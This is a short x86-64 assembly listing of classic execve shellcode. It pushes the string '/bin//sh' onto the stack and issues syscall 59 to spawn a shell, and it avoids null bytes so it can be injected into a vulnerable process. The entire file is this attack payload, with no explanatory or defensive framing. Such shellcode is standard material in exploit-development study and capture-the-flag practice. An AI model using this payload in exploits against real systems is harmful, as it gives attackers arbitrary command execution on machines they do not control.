BITS 64

global main

main:
    xor eax, eax
    push rax
    mov rdi, 0x68732f2f6e69622f ;/bin//sh
    push rdi
    mov al, 0x3b
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall
